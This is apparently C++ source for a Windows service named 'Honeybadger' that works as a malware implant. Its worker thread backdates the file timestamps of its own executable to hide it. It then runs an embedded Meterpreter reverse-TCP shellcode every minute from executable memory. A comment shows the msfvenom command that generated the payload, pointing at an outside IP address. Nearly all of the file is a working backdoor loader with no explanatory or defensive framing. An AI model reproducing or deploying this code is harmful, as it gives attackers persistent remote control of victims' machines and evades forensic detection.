#include <Windows.h>
#include <fstream>
#include <tchar.h>
#include <string>

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME  _T("Honeybadger")


// DEBUG, log...
void WriteLog(char * szLog)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	FILE *fp;
	fp = fopen("D:\\log.txt", "at");
	fprintf(fp, "%02d:%02d:%02d, ", st.wHour, st.wMinute, st.wSecond);
	fprintf(fp, szLog);
	fclose(fp);
	OutputDebugStringA(szLog);
}



int _tmain(int argc, TCHAR *argv[])
{
	SERVICE_TABLE_ENTRY ServiceTable[] =
	{
		{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};

	if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
	{
		printf("Start service control dispatcher returned error.\n");
		return GetLastError();
	}

	printf("Service main exit.\n");
	return 0;
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
	DWORD Status = E_FAIL;

	printf("Service main entry.\n");

	g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

	if (g_StatusHandle == NULL)
	{
		printf("Register service control handler returned error.\n");
		return;
	}

	// Tell the service controller we are starting
	ZeroMemory(&g_ServiceStatus, sizeof (g_ServiceStatus));
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		printf("Set service status returned error.\n");
	}

	/*
	* Perform tasks neccesary to start the service here
	*/
	printf("Performing service start operations.\n");

	// Create stop event to wait on later.
	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL)
	{
		printf("CreateEvent(g_ServiceStopEvent) returned error.\n");

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			printf("Set service status returned error.\n");
		}
		return;
	}

	// Tell the service controller we are started
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		printf("Set service status returned error.\n");
	}

	// Start the thread that will perform the main task of the service
	HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

	printf("Waiting for worker thread to complete.\n");

	// Wait until our worker thread exits effectively signaling that the service needs to stop
	WaitForSingleObject(hThread, INFINITE);

	printf("Worker thread stop event signaled.\n");


	/*
	* Perform any cleanup tasks
	*/
	printf("Performing cleanup operations.\n");

	CloseHandle(g_ServiceStopEvent);

	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		printf("Set service status returned error.\n");
	}

	printf("Service main exit.\n");
	return;
}


VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
	printf("Service control handler entry.\n");

	switch (CtrlCode)
	{
	case SERVICE_CONTROL_STOP:

		printf("Service control handler SERVICE_CONTROL_STOP request.\n");

		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;

		// Perform tasks neccesary to stop the service here 
		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			printf("Set service status returned error.\n");
		}

		// This will signal the worker thread to start shutting down
		SetEvent(g_ServiceStopEvent);

		break;

	default:
		break;
	}

	printf("Service control handler exit.\n");
}

void ExecuteShellcodeInMem()
{
	/*
	msfvenom -p windows/meterpreter/reverse_tcp lhost=35.197.63.187 lport=80 exitfunc=thread -a x86 --platform windows -f c -b "\x00"
	Found 22 compatible encoders
	Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
	x86/shikata_ga_nai succeeded with size 220 (iteration=0)

	*/
	// x64:
	
	const char buf[] =
	"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
	"\xff\xff\x48\xbb\x1f\x11\xf3\xde\x2d\xb9\x50\x7e\x48\x31\x58"
	"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe3\x59\x70\x3a\xdd\x51"
	"\x9c\x7e\x1f\x11\xb2\x8f\x6c\xe9\x02\x2f\x49\x59\xc2\x0c\x48"
	"\xf1\xdb\x2c\x7f\x59\x78\x8c\x35\xf1\xdb\x2c\x3f\x59\x78\xac"
	"\x7d\xf1\x5f\xc9\x55\x5b\xbe\xef\xe4\xf1\x61\xbe\xb3\x2d\x92"
	"\xa2\x2f\x95\x70\x3f\xde\xd8\xfe\x9f\x2c\x78\xb2\x93\x4d\x50"
	"\xa2\x96\xa6\xeb\x70\xf5\x5d\x2d\xbb\xdf\xfd\xdf\xd1\x06\x07"
	"\x1a\xf1\xd1\xa8\xcb\x50\x7e\x1f\x9a\x73\x56\x2d\xb9\x50\x36"
	"\x9a\xd1\x87\xb9\x65\xb8\x80\x2e\x94\x59\xeb\x9a\xa6\xf9\x70"
	"\x37\x1e\xc1\x10\x88\x65\x46\x99\x3f\x94\x25\x7b\x96\x2c\x6f"
	"\x1d\x4f\xd6\x59\xc2\x1e\x81\xf8\x91\xb7\x12\x50\xf2\x1f\x15"
	"\x59\x25\x8f\x53\x12\xbf\xfa\x25\xfc\x69\xaf\x6a\xc9\xab\x9a"
	"\xa6\xf9\x74\x37\x1e\xc1\x95\x9f\xa6\xb5\x18\x3a\x94\x51\xef"
	"\x97\x2c\x69\x11\xf5\x1b\x99\xbb\xdf\xfd\xf8\x08\x3f\x47\x4f"
	"\xaa\x84\x6c\xe1\x11\x27\x5e\x4b\xbb\x5d\xc1\x99\x11\x2c\xe0"
	"\xf1\xab\x9f\x74\xe3\x18\xf5\x0d\xf8\xb8\x21\xd2\x46\x0d\x37"
	"\xa1\x66\x80\xec\x72\x8a\x62\x7e\x1f\x50\xa5\x97\xa4\x5f\x18"
	"\xff\xf3\xb1\xf2\xde\x2d\xf0\xd9\x9b\x56\xad\xf1\xde\x2d\xe9"
	"\x73\xbb\x20\xaa\xb2\x8a\x64\x30\xb4\x32\x96\xe0\xb2\x64\x61"
	"\xce\x76\x79\xe0\xc4\xbf\x57\xc7\xd1\x51\x7f\x1f\x11\xaa\x9f"
	"\x97\x90\xd0\x15\x1f\xee\x26\xb4\x27\xf8\x0e\x2e\x4f\x5c\xc2"
	"\x17\x60\x88\x90\x36\xe0\xd1\xbb\x57\xef\xf1\xaf\xbe\x57\x98"
	"\x32\x9f\x97\x53\x5f\xa1\xff\xee\x26\x96\xa4\x7e\x3a\x6e\x5e"
	"\x49\xbf\x57\xcf\xf1\xd9\x87\x5e\xab\x6a\x7b\x59\xd8\xaf\xab"
	"\x9a\xd1\x87\xd4\x64\x46\x9e\x0b\xfa\xf9\x60\xde\x2d\xb9\x18"
	"\xfd\xf3\x01\xbb\x57\xcf\xf4\x61\xb7\x75\x15\xb2\x86\x65\x30"
	"\xa9\x3f\xa5\x13\x2a\x16\x72\x46\x85\xfd\xe7\x11\x8d\x8b\x65"
	"\x3a\x94\x5e\x41\x98\x05\xb4\x6d\xf8\x09\x16\x1f\x01\xf3\xde"
	"\x6c\xe1\x18\xf7\xed\x59\xc2\x17\x6c\x03\x08\xda\x4c\xf4\x0c"
	"\x0b\x65\x30\x93\x37\x96\xd6\xbe\xef\xe4\xf0\xd9\x8e\x57\x98"
	"\x29\x96\xa4\x40\x11\xc4\x1d\xc8\x3b\x81\xd2\x6c\xd3\x86\x1f"
	"\x6c\xdb\x86\x6c\xee\x09\x16\x1f\x51\xf3\xde\x6c\xe1\x3a\x7e"
	"\x45\x50\x49\xd5\x02\xb6\x60\x81\xca\x46\xaa\x9f\x97\xcc\x3e"
	"\x33\x7e\xee\x26\x97\xd2\x77\xb9\x42\xe0\xee\x0c\x96\x2c\x7a"
	"\x18\x57\xd9\x59\x76\x28\x58\x0d\x11\x81\xf8\x49\x99\xde\x74"
	"\x02\xb0\x63\x35\x1b\xb2\x57\xf7\x46\x85\x7e";
	
	// win32:
	/*
	const char buf[] =
		"\xda\xd5\xd9\x74\x24\xf4\x58\xba\xeb\x70\x42\x4c\x29\xc9\xb1"
		"\x59\x31\x50\x19\x03\x50\x19\x83\xc0\x04\x09\x85\xbe\xa4\x4f"
		"\x66\x3f\x35\x2f\xee\xda\x04\x6f\x94\xaf\x37\x5f\xde\xe2\xbb"
		"\x14\xb2\x16\x4f\x58\x1b\x18\xf8\xd6\x7d\x17\xf9\x4a\xbd\x36"
		"\x79\x90\x92\x98\x40\x5b\xe7\xd9\x85\x81\x0a\x8b\x5e\xce\xb9"
		"\x3c\xea\x9a\x01\xb6\xa0\x0b\x02\x2b\x70\x2a\x23\xfa\x0a\x75"
		"\xe3\xfc\xdf\x0e\xaa\xe6\x3c\x2a\x64\x9c\xf7\xc1\x77\x74\xc6"
		"\x2a\xdb\xb9\xe6\xd9\x25\xfd\xc1\x01\x50\xf7\x31\xbc\x63\xcc"
		"\x48\x1a\xe1\xd7\xeb\xe9\x51\x3c\x0d\x3e\x07\xb7\x01\x8b\x43"
		"\x9f\x05\x0a\x87\xab\x32\x87\x26\x7c\xb3\xd3\x0c\x58\x9f\x80"
		"\x2d\xf9\x45\x67\x51\x19\x26\xd8\xf7\x51\xcb\x0d\x8a\x3b\x84"
		"\xe2\xa7\xc3\x54\x6c\xbf\xb0\x66\x33\x6b\x5f\xcb\xbc\xb5\x98"
		"\x2c\x97\x02\x36\xd3\x17\x73\x1e\x10\x43\x23\x08\xb1\xeb\xa8"
		"\xc8\x3e\x3e\x44\xc3\xa8\xe3\x5c\xec\x93\x8b\x5c\x13\xe4\x1b"
		"\xe8\xf5\xb4\xcb\xba\xa9\x74\xbb\x7a\x1a\x1d\xd1\x74\x45\x3d"
		"\xda\x5e\xee\xd4\x34\x37\x46\x41\xad\x12\x1c\xf0\x32\x89\x58"
		"\x32\xb8\x38\x9c\xfd\x48\x48\x8e\xea\x29\xb2\x4e\xeb\xc3\xb2"
		"\x24\xef\x45\xe4\xd0\xed\xb0\xc2\x7e\x0d\x97\x50\x78\xf1\x69"
		"\x61\xf2\xc4\xff\xcd\x6c\x29\xef\xcd\x6c\x7f\x65\xce\x04\x27"
		"\xdd\x9d\x31\x28\xc8\xb1\xe9\xbd\xf2\xe3\x5e\x15\x9a\x09\xb8"
		"\x51\x05\xf1\xef\xe1\x41\x0d\x6d\xc4\xe9\x66\x8d\x48\x09\x77"
		"\xe7\x48\x59\x1f\xfc\x67\x56\xef\xfd\xad\x3f\x67\x77\x20\xf2"
		"\x16\x88\x69\x52\x87\x89\x9e\x4e\xde\x07\x60\x71\xdf\xe9\x5d"
		"\xa4\xe6\x9f\xa6\x75\x5d\xbf\x34\x53\xa8\x28\xe1\x36\x11\x35"
		"\x12\xed\x56\x40\x91\x07\x27\xb7\x89\x62\x22\xf3\x0d\x9f\x5e"
		"\x6c\xf8\x9f\xcd\x8d\x29";
	*/
	LPVOID lpvAddr;
	HANDLE hHand;
	DWORD dWaitRet, dThreadId;
	BOOL bSuccess;

	lpvAddr = VirtualAlloc(NULL, strlen(buf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (lpvAddr == NULL) {
		printf("VirtualAlloc failed.\n");
		return;
	}

	RtlMoveMemory(lpvAddr, buf, strlen(buf));
	hHand = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvAddr, NULL, 0, &dThreadId);
	if (hHand == NULL) {
		printf("Create thread failed.\n");
		return;
	}

	printf("Starting new thread... \n");
	dWaitRet = WaitForSingleObject(hHand, 3600000);

	switch (dWaitRet)
	{
	case WAIT_OBJECT_0:
		printf("Thread has been terminated.\n");
		break;

	case WAIT_TIMEOUT:
		printf("Wait single object timeout.\n");
		return;

	case WAIT_ABANDONED:
		printf("Ownership issue with mutex.\n");
		break;

	case WAIT_FAILED:
		printf("Wait single object failed.\n");
		return;
	}


	bSuccess = VirtualFree(lpvAddr, 0, MEM_RELEASE);
	if (bSuccess)
	{
		printf("Memory release successed.\n");
	}
	else
	{
		printf("Memory release failed.\n");
	}
	return;
}


int ChangeFileTime()
{
	printf("Set file create time.");

	SYSTEMTIME createTime;
	GetSystemTime(&createTime);
	createTime.wDay = 13;            //changes the day
	createTime.wMonth = 07;         //changes the month
	createTime.wYear = 2009;        //changes the year
	createTime.wHour = 23;           //changes the hour
	createTime.wMinute = 52;         //changes the minute
	createTime.wSecond = 7;         //changes the second

	SYSTEMTIME lastWriteTime;
	GetSystemTime(&lastWriteTime);
	lastWriteTime.wDay = 14;        //changes the day
	lastWriteTime.wMonth = 07;      //changes the month
	lastWriteTime.wYear = 2009;     //changes the year
	lastWriteTime.wHour = 1;        //changes the hour
	lastWriteTime.wMinute = 38;     //changes the minute
	lastWriteTime.wSecond = 8;     //changes the second

	SYSTEMTIME lastAccessTime;
	GetSystemTime(&lastAccessTime);
	lastAccessTime.wDay = 13;       //changes the day
	lastAccessTime.wMonth = 07;     //changes the month
	lastAccessTime.wYear = 2009;    //changes the year
	lastAccessTime.wHour = 23;      //changes the hour
	lastAccessTime.wMinute = 52;    //changes the minute
	lastAccessTime.wSecond = 24;     //changes the second

	//creation of a filetimestruct and convert our new systemtime
	FILETIME lastWriteFiletime;
	SystemTimeToFileTime(&lastWriteTime, &lastWriteFiletime);

	FILETIME createFiletime;
	SystemTimeToFileTime(&createTime, &createFiletime);

	FILETIME lastAccessFileTime;
	SystemTimeToFileTime(&lastAccessTime, &lastAccessFileTime);


	char strModule[256];
	GetModuleFileName(NULL, strModule, 256); //得到当前模块路径

	//getthe handle to the file
	HANDLE filename = CreateFile(strModule, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	//set the filetime on the file
	SetFileTime(filename, &createFiletime, &lastAccessFileTime, &lastWriteFiletime);

	//close our handle.
	CloseHandle(filename);

	return 0;
}



DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
	printf("Worker thread entry.\n");

	// Change file create time
	ChangeFileTime();

	// Periodically check if the service has been requested to stop
	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
	{
		printf("Execute shellcode in memory... \n");
		ExecuteShellcodeInMem();
		Sleep(60000);
	}

	printf("Worker thread exit.\n");

	return ERROR_SUCCESS;
}
